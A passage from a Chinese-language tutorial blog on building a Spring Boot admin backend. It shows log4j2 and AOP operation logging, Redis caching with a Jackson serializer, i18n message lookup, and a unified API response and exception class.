拦截所有请求，通过判断是否有 @LoginRequired 注解 决定是否需要登录 } @Bean public AuthenticationInterceptor authenticationInterceptor() { return new AuthenticationInterceptor(); } } 整合日志实现 整体思路：SLF4j+log4j2+Aop\n1. 添加依赖 lab-admin\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;!-- SpringBoot Web容器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;!--以下是排除的组件--\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;!--排除默认自带的log组件--\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-logging\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--log4j2日志相关 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-log4j2\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringBoot 拦截器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-aop\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 2. 创建数据库表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 -- ---------------------------- -- 操作日志记录 -- ---------------------------- drop table if exists sys_oper_log; create table sys_oper_log ( oper_id bigint(20) not null auto_increment comment \u0026#39;日志主键\u0026#39;, title varchar(50) default \u0026#39;\u0026#39; comment \u0026#39;模块标题\u0026#39;, business_type int(2) default 0 comment \u0026#39;业务类型（0其它 1新增 2修改 3删除）\u0026#39;, method varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;方法名称\u0026#39;, request_method varchar(10) default \u0026#39;\u0026#39; comment \u0026#39;请求方式\u0026#39;, operator_type int(1) default 0 comment \u0026#39;操作类别（0其它 1后台用户 2手机端用户）\u0026#39;, oper_name varchar(50) default \u0026#39;\u0026#39; comment \u0026#39;操作人员\u0026#39;, oper_url varchar(255) default \u0026#39;\u0026#39; comment \u0026#39;请求URL\u0026#39;, oper_ip varchar(128) default \u0026#39;\u0026#39; comment \u0026#39;主机地址\u0026#39;, oper_location varchar(255) default \u0026#39;\u0026#39; comment \u0026#39;操作地点\u0026#39;, oper_param varchar(2000) default \u0026#39;\u0026#39; comment \u0026#39;请求参数\u0026#39;, json_result varchar(2000) default \u0026#39;\u0026#39; comment \u0026#39;返回参数\u0026#39;, status int(1) default 0 comment \u0026#39;操作状态（0正常 1异常）\u0026#39;, error_msg varchar(2000) default \u0026#39;\u0026#39; comment \u0026#39;错误消息\u0026#39;, oper_time datetime comment \u0026#39;操作时间\u0026#39;, primary key (oper_id) ) engine=innodb auto_increment=100 comment = \u0026#39;操作日志记录\u0026#39;; 3. 自定义注解@Log及相关枚举 一、Log\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 @Target({ ElementType.PARAMETER, ElementType.METHOD }) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface Log { /** * 模块 */ String title() default \u0026#34;\u0026#34;; /** * 功能 */ BusinessType businessType() default BusinessType.OTHER; /** * 操作人类别 */ OperatorType operatorType() default OperatorType.MANAGE; /** * 是否保存请求的参数 */ boolean isSaveRequestData() default true; /** * 是否保存响应的参数 */ boolean isSaveResponseData() default true; } 二、BusinessType\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 public enum BusinessType { /** * 其它 */ OTHER, /** * 新增 */ INSERT, /** * 修改 */ UPDATE, /** * 删除 */ DELETE, /** * 授权 */ GRANT, /** * 导出 */ EXPORT, /** * 导入 */ IMPORT, /** * 强退 */ FORCE, /** * 生成代码 */ GENCODE, /** * 清空数据 */ CLEAN, } 三、OperatorType\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public enum OperatorType { /** * 其它 */ OTHER, /** * 后台用户 */ MANAGE, /** * 手机端用户 */ MOBILE } 4. AOP切面处理请求操作日志 核心的LogAspect切面处理类中的保存Log具体处理方法handleLog主要逻辑：\n获得注解 从缓存获取当前的用户信息(暂缺，先模拟一个) 获取请求各项需要记录的基本信息 判断请求是否有异常 保存到数据库 打印到控制台 代码片段如下，详细代码见LogAspect\n1 2 3 4 5 6 7 8 9 10 /** * 处理完请求后执行 * * @param joinPoint 切点 */ @AfterReturning(pointcut = \u0026#34;@annotation(controllerLog)\u0026#34;, returning = \u0026#34;jsonResult\u0026#34;) public void doAfterReturning(JoinPoint joinPoint, Log controllerLog, Object jsonResult) { handleLog(joinPoint, controllerLog, null, jsonResult); } 5. aop代理配置 1 2 3 4 5 6 @Configuration // 表示通过aop框架暴露该代理对象,AopContext能够访问 @EnableAspectJAutoProxy(exposeProxy = true) public class ApplicationConfig { } 参考链接：\n注解@EnableAspectJAutoProxy(exposeProxy = true) exposeProxy 的用法\n5. log4j2的配置文件 日志的配置主要用在生产环境中\n参考链接：\nSpringBoot 配置控制台彩色日志输出\n配置文件位置：\napplication.yml\n1 2 3 4 5 #日志配置 logging: level: org.opengms: debug org.springframework: warn application-prod.yml\n1 2 3 4 5 6 7 8 lab: profile: /home/opengms-lab/uploadPath #日志配置 logging: config: classpath:log4j2-config.xml file: path: /home/opengms-lab/logs 参考链接：\nlog4j2 配置文件读取 application.yml 的日志路径变量\nlog4j2-config.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!-- 6个优先级从高到低依次为：OFF、FATAL、ERROR、WARN、INFO、DEBUG、TRACE、 ALL。 如果设置优先级为WARN，那么OFF、FATAL、ERROR、WARN 4个级别的log能正常输出 设置为OFF 表示不记录log4j2本身的日志， --\u0026gt; \u0026lt;!-- status：用来指定log4j本身的打印日志级别,monitorInterval:指定log4j自动重新配置的监测间隔时间 --\u0026gt; \u0026lt;Configuration status=\u0026#34;fatal\u0026#34;\u0026gt; \u0026lt;Properties\u0026gt; \u0026lt;!-- 日志输出格式 --\u0026gt; \u0026lt;!--\u0026lt;property name=\u0026#34;LOG_PATTERN\u0026#34; value=\u0026#34;%d{yyyy-MM-dd HH:mm:ss.SSS} %5p ${PID:-} [%15.15t] %-40.40logger{39} : %m%n\u0026#34; /\u0026gt;--\u0026gt; \u0026lt;property name=\u0026#34;LOG_PATTERN\u0026#34; value=\u0026#34;%d{yyyy-MM-dd HH:mm:ss.SSS} %highlight{%5level} %style{%pid}{yellow} --- [%15.15t] %style{%-40.40logger{39}}{blue} : %msg%n%style{%throwable}{red}\u0026#34; /\u0026gt; \u0026lt;!-- ${sys:LOG_PATH} 读取的就是 application.yml 中的 logging.file.path 的值 --\u0026gt; \u0026lt;property name=\u0026#34;baseDir\u0026#34; value=\u0026#34;${sys:LOG_PATH}\u0026#34; /\u0026gt; \u0026lt;/Properties\u0026gt; \u0026lt;Appenders\u0026gt; \u0026lt;Console name=\u0026#34;Console\u0026#34; target=\u0026#34;SYSTEM_OUT\u0026#34;\u0026gt; \u0026lt;!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch） --\u0026gt; \u0026lt;ThresholdFilter level=\u0026#34;debug\u0026#34; onMatch=\u0026#34;ACCEPT\u0026#34; onMismatch=\u0026#34;DENY\u0026#34;/\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;${LOG_PATTERN}\u0026#34; disableAnsi=\u0026#34;false\u0026#34; noConsoleNoAnsi=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;!--\u0026lt;PatternLayout--\u0026gt; \u0026lt;!-- pattern=\u0026#34;%d{yyyy-MM-dd HH:mm:ss.SSS} %highlight{%5level} %style{%pid}{yellow} -\u0026amp;#45;\u0026amp;#45; [%15.15t] %style{%-40.40logger{39}}{blue} : %msg%n%style{%throwable}{red}\u0026#34;--\u0026gt; \u0026lt;!-- disableAnsi=\u0026#34;false\u0026#34; noConsoleNoAnsi=\u0026#34;false\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;/Console\u0026gt; \u0026lt;!--debug级别日志文件输出--\u0026gt; \u0026lt;!--\u0026lt;RollingFile name=\u0026#34;debug_appender\u0026#34; fileName=\u0026#34;${baseDir}/debug.log\u0026#34;--\u0026gt; \u0026lt;!-- filePattern=\u0026#34;${baseDir}/debug_%i.log.%d{yyyy-MM-dd}\u0026#34;\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; 过滤器 \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;Filters\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; 限制日志级别在debug及以上在info以下 \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;ThresholdFilter level=\u0026#34;debug\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;ThresholdFilter level=\u0026#34;info\u0026#34; onMatch=\u0026#34;DENY\u0026#34; onMismatch=\u0026#34;NEUTRAL\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/Filters\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; 日志格式 \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;PatternLayout pattern=\u0026#34;${LOG_PATTERN}\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; 策略 \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;Policies\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; 每隔一天转存 \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;TimeBasedTriggeringPolicy interval=\u0026#34;1\u0026#34; modulate=\u0026#34;true\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; 文件大小 \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;SizeBasedTriggeringPolicy size=\u0026#34;100 MB\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/Policies\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件开始覆盖\u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;DefaultRolloverStrategy max=\u0026#34;15\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/RollingFile\u0026gt;--\u0026gt; \u0026lt;!-- info级别日志文件输出 --\u0026gt; \u0026lt;RollingFile name=\u0026#34;info_appender\u0026#34; fileName=\u0026#34;${baseDir}/info.log\u0026#34; filePattern=\u0026#34;${baseDir}/info_%i.log.%d{yyyy-MM-dd}\u0026#34;\u0026gt; \u0026lt;!-- 过滤器 --\u0026gt; \u0026lt;Filters\u0026gt; \u0026lt;!-- 限制日志级别在info及以上在error以下 --\u0026gt; \u0026lt;ThresholdFilter level=\u0026#34;info\u0026#34;/\u0026gt; \u0026lt;ThresholdFilter level=\u0026#34;error\u0026#34; onMatch=\u0026#34;DENY\u0026#34; onMismatch=\u0026#34;NEUTRAL\u0026#34;/\u0026gt; \u0026lt;/Filters\u0026gt; \u0026lt;!-- 日志格式 --\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;${LOG_PATTERN}\u0026#34;/\u0026gt; \u0026lt;!-- 策略 --\u0026gt; \u0026lt;Policies\u0026gt; \u0026lt;!-- 每隔一天转存 --\u0026gt; \u0026lt;TimeBasedTriggeringPolicy interval=\u0026#34;1\u0026#34; modulate=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;!-- 文件大小 --\u0026gt; \u0026lt;SizeBasedTriggeringPolicy size=\u0026#34;100 MB\u0026#34;/\u0026gt; \u0026lt;/Policies\u0026gt; \u0026lt;!-- DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件开始覆盖--\u0026gt; \u0026lt;DefaultRolloverStrategy max=\u0026#34;15\u0026#34;/\u0026gt; \u0026lt;/RollingFile\u0026gt; \u0026lt;!-- error级别日志文件输出 --\u0026gt; \u0026lt;RollingFile name=\u0026#34;error_appender\u0026#34; fileName=\u0026#34;${baseDir}/error.log\u0026#34; filePattern=\u0026#34;${baseDir}/error_%i.log.%d{yyyy-MM-dd}\u0026#34;\u0026gt; \u0026lt;!-- 过滤器 --\u0026gt; \u0026lt;Filters\u0026gt; \u0026lt;!-- 限制日志级别在error及以上 --\u0026gt; \u0026lt;ThresholdFilter level=\u0026#34;error\u0026#34;/\u0026gt; \u0026lt;/Filters\u0026gt; \u0026lt;!-- 日志格式 --\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;${LOG_PATTERN}\u0026#34;/\u0026gt; \u0026lt;Policies\u0026gt; \u0026lt;!-- 每隔一天转存 --\u0026gt; \u0026lt;TimeBasedTriggeringPolicy interval=\u0026#34;1\u0026#34; modulate=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;!-- 文件大小 --\u0026gt; \u0026lt;SizeBasedTriggeringPolicy size=\u0026#34;100 MB\u0026#34;/\u0026gt; \u0026lt;/Policies\u0026gt; \u0026lt;!-- DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件开始覆盖--\u0026gt; \u0026lt;DefaultRolloverStrategy max=\u0026#34;15\u0026#34;/\u0026gt; \u0026lt;/RollingFile\u0026gt; \u0026lt;/Appenders\u0026gt; \u0026lt;!--Logger节点用来单独指定日志的形式，比如要为指定包下的class指定不同的日志级别等。--\u0026gt; \u0026lt;!--然后定义loggers，只有定义了logger并引入的appender，appender才会生效--\u0026gt; \u0026lt;!--监控系统信息--\u0026gt; \u0026lt;!--若是additivity设为false，则 子Logger 只会在自己的appender里输出，而不会在 父Logger 的appender里输出。--\u0026gt; \u0026lt;Loggers\u0026gt; \u0026lt;!--过滤掉spring和mybatis的一些无用的DEBUG信息--\u0026gt; \u0026lt;logger name=\u0026#34;org.mybatis\u0026#34; level=\u0026#34;info\u0026#34; additivity=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;Console\u0026#34;/\u0026gt; \u0026lt;/logger\u0026gt; \u0026lt;Logger name=\u0026#34;org.springframework\u0026#34; level=\u0026#34;WARN\u0026#34; additivity=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;Console\u0026#34;/\u0026gt; \u0026lt;/Logger\u0026gt; \u0026lt;!--pagehelper日志输出限制--\u0026gt; \u0026lt;!--\u0026lt;Logger name=\u0026#34;com.github.pagehelper\u0026#34; level=\u0026#34;info\u0026#34; additivity=\u0026#34;false\u0026#34;\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;AppenderRef ref=\u0026#34;Console\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/Logger\u0026gt;--\u0026gt; \u0026lt;!-- 设置com.zaxxer.hikari包下的日志只打印WARN及以上级别的日志 --\u0026gt; \u0026lt;logger name=\u0026#34;com.zaxxer.hikari\u0026#34; level=\u0026#34;WARN\u0026#34; additivity=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;appender-ref ref=\u0026#34;Console\u0026#34;/\u0026gt; \u0026lt;/logger\u0026gt; \u0026lt;!-- 设置org.hibernate.validator包下的日志只打印WARN及以上级别的日志 --\u0026gt; \u0026lt;logger name=\u0026#34;org.hibernate.validator\u0026#34; level=\u0026#34;WARN\u0026#34; additivity=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;appender-ref ref=\u0026#34;Console\u0026#34;/\u0026gt; \u0026lt;/logger\u0026gt; \u0026lt;!-- 设置org.apache包下的日志只打印WARN及以上级别的日志 --\u0026gt; \u0026lt;!-- \u0026lt;logger name=\u0026#34;org.apache\u0026#34; level=\u0026#34;WARN\u0026#34; additivity=\u0026#34;false\u0026#34;\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;appender-ref ref=\u0026#34;Console\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/logger\u0026gt;--\u0026gt; \u0026lt;Root level=\u0026#34;info\u0026#34;\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;Console\u0026#34;/\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;debug_appender\u0026#34;/\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;info_appender\u0026#34;/\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;error_appender\u0026#34;/\u0026gt; \u0026lt;/Root\u0026gt; \u0026lt;/Loggers\u0026gt; \u0026lt;/Configuration\u0026gt; 参考链接：\nlog4j2.xml 的标签 loggers 中 root 的属性 level 指的是什么\n整合Redis缓存 1. 添加依赖 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!--redis 缓存操作 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-data-redis\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--pool 对象池 --\u0026gt; \u0026lt;!-- spring2.0集成redis所需common-pool2 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-pool2\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 2. Redis数据库连接信息配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 spring: redis: # Redis默认情况下有16个分片，这里配置具体使用的分片，默认是0 database: 0 host: localhost port: 6379 # 连接密码（默认为空） password: # 连接超时时间（毫秒) timeout: 50ms lettuce: pool: # 连接池最大连接数（使用负值表示没有限制） 默认 8 max-active: 8 # 连接池最大阻塞等待时间（使用负值表示没有限制） 默认 -1 max-wait: -1 # 连接池中的最大空闲连接 默认 8 max-idle: 8 # 连接池中的最小空闲连接 默认 0 min-idle: 0 3. 在RedisConfig中自定义RedisTemplate解决序列化问题 这里使用jackon。fastjson出事太多了，实际业务开发中尽量少用为妙\nfastjson到底做错了什么？为什么会被频繁爆出漏洞？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 @Configuration @EnableCaching public class RedisConfig { @Bean public RedisTemplate\u0026lt;String, Object\u0026gt; template(RedisConnectionFactory factory) { // 创建RedisTemplate\u0026lt;String, Object\u0026gt;对象 RedisTemplate\u0026lt;String, Object\u0026gt; template = new RedisTemplate\u0026lt;\u0026gt;(); // 配置连接工厂 template.setConnectionFactory(factory); // redis key 序列化方式使用stringSerial template.setKeySerializer(new StringRedisSerializer()); // redis value 序列化方式自定义 // template.setValueSerializer(new GenericFastJsonRedisSerializer()); template.setValueSerializer(valueSerializer()); // redis hash key 序列化方式使用stringSerial template.setHashKeySerializer(new StringRedisSerializer()); // redis hash value 序列化方式自定义 // template.setHashValueSerializer(new GenericFastJsonRedisSerializer()); template.setHashValueSerializer(valueSerializer()); return template; } private RedisSerializer\u0026lt;Object\u0026gt; valueSerializer() { Jackson2JsonRedisSerializer\u0026lt;Object\u0026gt; jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer\u0026lt;\u0026gt;(Object.class); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY); // 此项必须配置，否则如果序列化的对象里边还有对象，会报如下错误： // java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to XXX objectMapper.activateDefaultTyping( objectMapper.getPolymorphicTypeValidator(), ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY); // 旧版写法： // objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY); jackson2JsonRedisSerializer.setObjectMapper(objectMapper); return jackson2JsonRedisSerializer; } } 使用jackson在进行序列化反序列化时 redis报错： Could not read JSON: Unrecognized field “enabled“\n参考链接：https://blog.csdn.net/qq_41706331/article/details/119242055\n原因：序列化时多了几个字段，这是因为为了整合springsecurity在User类中实现了UserDetails接口，重写了这些方法\n解决：使用@JsonIgnoreProperties注解，可以在User对象在序列化时忽略这些字段。在User类前添加：\n1 @JsonIgnoreProperties({\u0026#34;enabled\u0026#34;,\u0026#34;accountNonExpired\u0026#34;, \u0026#34;accountNonLocked\u0026#34;, \u0026#34;credentialsNonExpired\u0026#34;, \u0026#34;authorities\u0026#34;}) 4. 封装RedisUtils \u0026ndash; Redis常用命令工具类 5.Redis测试使用 在lab-admin中扫描common模块的bean（因为springboot的@SpringBootApplication注解默认扫描范围为自己的启动类所在的包及其子包）\n参考链接：\nSpringBoot多模块项目中无法注入其他模块中的spring bean\n1 2 3 4 5 6 7 8 @Configuration // 表示通过aop框架暴露该代理对象,AopContext能够访问 @EnableAspectJAutoProxy(exposeProxy = true) // 扫描common模块的bean @ComponentScan(value = {\u0026#34;org.opengms.common\u0026#34;}) public class ApplicationConfig { } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 @Autowired private RedisUtils redisUtils; @GetMapping(\u0026#34;/helloRedis\u0026#34;) public String helloRedis(){ // 测试写入一个string类型键值,过期时间20S redisUtils.set(\u0026#34;key1\u0026#34;, \u0026#34;Gangbb\u0026#34;, 20); System.out.println(\u0026#34;获取key1值\u0026#34;+ redisUtils.set(\u0026#34;key1\u0026#34;, \u0026#34;测试redis\u0026#34;, 20)); return \u0026#34;测试redis\u0026#34;; } @Cacheable(\u0026#34;cache1\u0026#34;) @GetMapping(\u0026#34;/helloRedis2\u0026#34;) public String helloRedis2(){ return \u0026#34;xxredis\u0026#34;; } @Cacheable(\u0026#34;cache2\u0026#34;) @GetMapping(\u0026#34;/helloRedis3\u0026#34;) public JSONObject helloRedis3(){ return getTestDetail(); } public JSONObject getTestDetail() { JSONObject retJson = new JSONObject(); String retCode = \u0026#34;1\u0026#34;; String retMsg = \u0026#34;操作失败！\u0026#34;; JSONObject bizDataJson = new JSONObject(); try { User user = new User(); user.setUserId(22L); user.setUserName(\u0026#34;bin\u0026#34;); user.setEmail(\u0026#34;78280@qq.com\u0026#34;); String key = \u0026#34;user::\u0026#34;+user.getUserId(); //向Redis中缓存数据，-1为设置永久时效 // redisUtils.set(key, user,-1); bizDataJson = JSONObject.parseObject(JSON.toJSONString(user)); retCode = \u0026#34;0\u0026#34;; retMsg = \u0026#34;操作成功！\u0026#34;; } catch (Exception e) { log.error(String.valueOf(e)); } retJson.put(\u0026#34;retCode\u0026#34;, retCode); retJson.put(\u0026#34;retMsg\u0026#34;, retMsg); retJson.put(\u0026#34;bizData\u0026#34;, bizDataJson); return retJson; } 参考链接：\nspring boot 缓存@EnableCaching\n使用@Cacheable时存到redis中的数据是Hex格式的\n解决：@EnableCaching与@Cacheable的使用方法，结合redis进行说明\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @Configuration @EnableCaching public class RedisConfig { @Bean public CacheManager cacheManager(RedisConnectionFactory factory){ //Duration.ofSeconds(120)设置缓存默认过期时间120秒 RedisCacheConfiguration config = RedisCacheConfiguration.defaultCacheConfig().entryTtl(Duration.ofSeconds(120)); //解决使用@Cacheable，redis数据库value乱码 config = config.serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(RedisSerializer.json())); RedisCacheManager cacheManager = RedisCacheManager.builder(factory).cacheDefaults(config).build(); return cacheManager; } } 6. Mybatis使用Redis做二级缓存 还未实现\n参考链接：\n从零搭建若依(Ruoyi-Vue)管理系统(6)\u0026ndash;整合Redis缓存\n国际化消息处理 1. 设置项目文件编码 需要将properties的文件编码设置成utf-8，否则会出现乱码????\n2. 新建一个Resourse Bundle 在lab-admin的resources目录下新建i8n文件夹储存所有国际化文本属性。 新建messages Resourse Bundle 参考链接：\nidea 2021. 2.3 中使用springboot 国际化 Resource Bundle不显示问题\n2. 国际化工具类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class MessageUtils { /** * 根据消息键和参数 获取消息 委托给spring messageSource * * @param code 消息键 * @param args 参数 * @return 获取国际化翻译值 */ public static String message(String code, Object... args) { MessageSource messageSource = SpringUtils.getBean(MessageSource.class); try { return messageSource.getMessage(code, args, LocaleContextHolder.getLocale()); } catch (Exception e) { return code; } } } 4. 测试使用 前端请求接口时在请求头Accept-Language附带语言信息（中文：zh-cn；英文：en-us；不设置默认中文）注意中间是一个横杠不是下划线，与properties文件有区别\n1 2 3 4 @GetMapping(\u0026#34;/message\u0026#34;) public String test() { return MessageUtils.message(\u0026#34;user.login.success\u0026#34;); } 统一对象返回和异常处理 1. 定义统一返回对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 public class ApiResponse extends HashMap\u0026lt;String, Object\u0026gt; { private static final long serialVersionUID = 1L; /** 状态码 */ public static final String CODE_TAG = \u0026#34;code\u0026#34;; /** 返回内容 */ public static final String MSG_TAG = \u0026#34;msg\u0026#34;; /** 数据对象 */ public static final String DATA_TAG = \u0026#34;data\u0026#34;; /** * 初始化一个新创建的 ApiResponse 对象，使其表示一个空消息。 */ public ApiResponse() { } /** * 初始化一个新创建的 ApiResponse 对象 * * @param code 状态码 * @param msg 返回内容 */ public ApiResponse(int code, String msg) { super.put(CODE_TAG, code); super.put(MSG_TAG, msg); } /** * 初始化一个新创建的 ApiResponse 对象 * * @param code 状态码 * @param msg 返回内容 * @param data 数据对象 */ public ApiResponse(int code, String msg, Object data) { super.put(CODE_TAG, code); super.put(MSG_TAG, msg); if (StringUtils.isNotNull(data)) { super.put(DATA_TAG, data); } } /** * 返回成功消息 * * @return 成功消息 */ public static ApiResponse success() { return ApiResponse.success(\u0026#34;操作成功\u0026#34;); } /** * 返回成功数据 * * @return 成功消息 */ public static ApiResponse success(Object data) { return ApiResponse.success(\u0026#34;操作成功\u0026#34;, data); } /** * 返回成功消息 * * @param msg 返回内容 * @return 成功消息 */ public static ApiResponse success(String msg) { return ApiResponse.success(msg, null); } /** * 返回成功消息 * * @param msg 返回内容 * @param data 数据对象 * @return 成功消息 */ public static ApiResponse success(String msg, Object data) { return new ApiResponse(HttpStatus.SUCCESS, msg, data); } /** * 返回错误消息 * * @return */ public static ApiResponse error() { return ApiResponse.error(\u0026#34;操作失败\u0026#34;); } /** * 返回错误消息 * * @param msg 返回内容 * @return 警告消息 */ public static ApiResponse error(String msg) { return ApiResponse.error(msg, null); } /** * 返回错误消息 * * @param msg 返回内容 * @param data 数据对象 * @return 警告消息 */ public static ApiResponse error(String msg, Object data) { return new ApiResponse(HttpStatus.ERROR, msg, data); } /** * 返回错误消息 * * @param code 状态码 * @param msg 返回内容 * @return 警告消息 */ public static ApiResponse error(int code, String msg) { return new ApiResponse(code, msg, null); } /** * 方便链式调用 * * @param key 键 * @param value 值 * @return 数据对象 */ @Override public ApiResponse put(String key, Object value) { super.put(key, value); return this; } } 2. 自定义异常类及错误码规范 定义一个自定义异常类，抛出时传入不同的状态码 ，通过不同状态码以及messages.properties中对应的错误信息区分不同异常。只要对状态码有一个统一定义规范就能有效区分不同异常进行管理\n自定义异常类ServiceException\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public final class ServiceException extends RuntimeException { private static final long serialVersionUID = 1L; /** * 错误码 */ private Integer code; /** * 错误提示 */ private String message; } message.properties\n1 2 3 4 5 6 7 user.email.not.valid=邮箱格式错误 user.mobile.phone.number.not.valid=手机号格式错误 user.login.success=登录成功 user.register.success=注册成功 user.notfound=请重新登录 user.forcelogout=管理员强制退出，请重新登录 user.unknown.error=未知错误，请重新登录 